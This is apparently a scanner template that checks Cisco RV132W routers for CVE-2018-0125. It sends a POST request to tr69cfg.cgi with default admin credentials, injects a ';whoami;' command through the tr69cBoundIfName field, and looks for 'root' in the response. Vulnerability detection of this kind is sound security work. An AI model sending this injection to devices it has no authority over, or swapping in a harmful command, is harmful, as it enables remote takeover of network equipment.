id: CVE-2018-0125

info:
  name: Cisco RV132W Unauthenticated WAN Remote Code Execution
  author: organiccrap
  severity: medium
  tags: cve,cve2018,cisco,lf
  reference: https://vulners.com/seebug/SSV:97135

requests:
  - method: POST
    path:
      - "{{BaseURL}}/tr69cfg.cgi"
    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/2010010 1 Firefox/54.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Content-Type: application/x-www-form-urlencoded
    body: 'submit_button=Basic_config&tr69cEnable=1&tr69cInformEnable=1&ipvEnable=0&tr69cInformInterval=300&tr69cAcsURL=http%3A%2F%2F{{Host}}&tr69cAcsUser=admin&tr69cAcsPwd=admin&tr69cConnReqUser=admin&tr69cConnReqPwd=admin&tr69cConnReqPort={{Port}}&tr69cNoneConnReqAuth=0&tr69cDebugEnable=0&tr69cAcsCert=&tr69cCpeCert=&downloadFileType=&tr69cBoundIfName=;whoami;&tr69cBindInterface=ETH_WAN_R&tr69=on&ipv=on&inform=on&informInterval=300&httpCategory=http%3A%2F%2F&acsURL={{Host}}&acsUser=admin&acsPwd=admin&debug=on&FileType=on&connReqAuth=on&connReqUser=admin&connReqPwd=admin&connReqPort={{Port}}&WANInterface=eth0.1'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root"
        part: body

      - type: status
        status:
          - 200
